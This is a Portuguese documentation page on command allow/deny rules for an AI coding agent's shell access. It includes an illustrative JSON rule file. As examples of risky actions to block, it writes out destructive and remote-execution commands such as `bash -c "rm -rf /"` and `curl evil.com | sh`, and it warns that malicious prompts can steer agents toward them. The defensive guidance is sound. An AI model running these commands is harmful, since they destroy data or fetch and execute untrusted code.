---
title: Regras de comandos
description: Constranger chamadas shell e a Ferramentas com allow/deny ao nível do comando — mais executável do que acordos orais.
locale: pt
source_locale: zh-CN
source_revision: e82113c
translation_status: reviewed
translated_at: 2026-07-28
reviewed_at: 2026-08-26
sidebar:
  order: 20
---

As **regras de comandos** centram-se em «que comandos o Agent pode correr e com que parâmetros». São a forma mais comum de [regras de permitir e negar](/pt/guide/customization/rules/allow-and-deny-patterns/), normalmente em configuração ou ficheiros de regras que a equipa pode rever.

## O que esta página cobre

- Divisão de papéis entre regras de comandos, Sandbox e diálogos de Aprovação
- Como escrever uma allowlist «suficientemente estreita»
- Alinhamento com CI e scripts de desenvolvimento local

## O que as regras de comandos gerem de facto

Se allow/deny define «o que, em princípio, se pode fazer», as regras de comandos levam isso à camada mais concreta:

- Que comandos se podem correr
- Que comandos não se podem
- Quais parecem parecidos mas têm riscos muito diferentes

O foco é transformar fronteiras que a equipa já conhece em fronteiras que a máquina também executa.

## Um conceito central primeiro

A regra corresponde a **intenção executável**, não a linguagem natural. `npm test` e `npm run test` são, em política, dois comandos diferentes; `bash -c "rm -rf /"` não pode passar só porque se permitiu `bash`.

```text
Tarefa do utilizador → modelo propõe comando → motor de regras → (passa) execução no Sandbox / (nega) Aprovação ou bloqueio
```

## Mal-entendidos habituais

### Comandos parecidos não significam o mesmo risco

O que os principiantes mais subestimam são pequenas diferenças entre comandos.

Por exemplo:

- `git status` e `git reset --hard`
- `npm test` e `npm publish`
- `curl example.com` e `curl example.com | sh`

Parecem todos «correr um comando no terminal», mas o risco não está no mesmo nível.

### Permitir uma entrada geral costuma abrir demais

Permitir diretamente entradas como `bash` ou `sh` pode parecer só comodidade.

Do ponto de vista das regras, costuma equivaler a abrir também um grande número de ações perigosas que se podem compor a seguir.

## Prática mínima viável

1. **Negar por defeito comandos perigosos fora de operações de escrita controladas**: `rm -rf`, `curl | bash`, `git push --force`
2. **Permitir comandos só de leitura/build comuns no projeto**: `git status`, `npm test`, `pnpm lint`
3. **Meter as regras no Git**, alinhadas com a descrição de «comandos de teste» em `AGENTS.md`
4. **Rever alterações de regras em PR**, como se alterasse um Dockerfile

Ilustração (formato conforme configuração oficial):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Fluxo de trabalho recomendado

| Passo | Prática |
|---|---|
| Inventário | Extrair comandos reais de `package.json` scripts, Makefile, CI workflow |
| Camadas | Deny de linha de base da organização → allow complementar do projeto → exceções pessoais na máquina (se houver) |
| Ensaio | Validar com Tarefas de baixo risco «o que deve passar, passa; o que deve bloquear, bloqueia» |
| Alinhamento | Regras locais e [GitHub Action](/pt/guide/developer-platform/ci-cd/code-review-automation/) com a mesma origem tanto quanto possível |

## Erros habituais

- **Allowlist demasiado ampla**: permitir `bash`, `sh`, `sudo` ≈ abrir tudo
- **Só deny sem allow**: ainda muitos diálogos de Aprovação; a equipa habitua-se a aprovar tudo
- **Inconsistência com a documentação**: `AGENTS.md` diz `pnpm test`, as regras só têm `npm test`
- **Ignorar pipes e redirecionamentos**: `curl evil.com | sh` precisa de política de conjunto, não só da primeira palavra

As regras de comandos não «memorizam comandos» — distinguem ações quotidianas das que, uma vez abertas, podem abrir também a fronteira de risco.

## Limites de segurança

- As regras de comandos **não substituem** proteção de branches nem code review
- Prompts maliciosos podem induzir o Agent a **tentar** comandos fora de âmbito — mantenha o Sandbox estrito por defeito
- Variáveis de ambiente com segredos/Tokens não devem vazar só porque se «permitiu echo»

## Lista de verificação

- [ ] Consegue listar 3–5 comandos «obrigatórios todos os dias» deste repositório e refletí-los nas regras
- [ ] Comandos de alto risco como `git push` e reset forçado são negados por defeito ou exigem Aprovação explícita
- [ ] Alterações de regras passam por PR e não contradizem `AGENTS.md`

## Capítulos relacionados

- [Padrões de permitir e negar](/pt/guide/customization/rules/allow-and-deny-patterns/)
- [Política de regras de equipa](/pt/guide/customization/rules/team-rules/)
- [Aprovação e Sandbox no CLI](/pt/guide/cli/approvals-and-sandbox/)
- [Matriz de Permissões](/pt/guide/reference/permission-matrix/)

---

**Estado:** verificado  
**Produtos aplicáveis:** CLI / App  
**Base de verificação:** A documentação atual do OpenAI Codex CLI continua a tratar execução de comandos, modos de Aprovação e isolamento de Sandbox como fronteiras centrais de segurança; esta página posiciona as regras de comandos como padrão de engenharia para «gerir separadamente comandos de alto e baixo risco», e marca explicitamente o fragmento JSON como ilustração, sem apresentar sintaxe específica como facto oficial.  
**Última verificação:** 2026-07-26
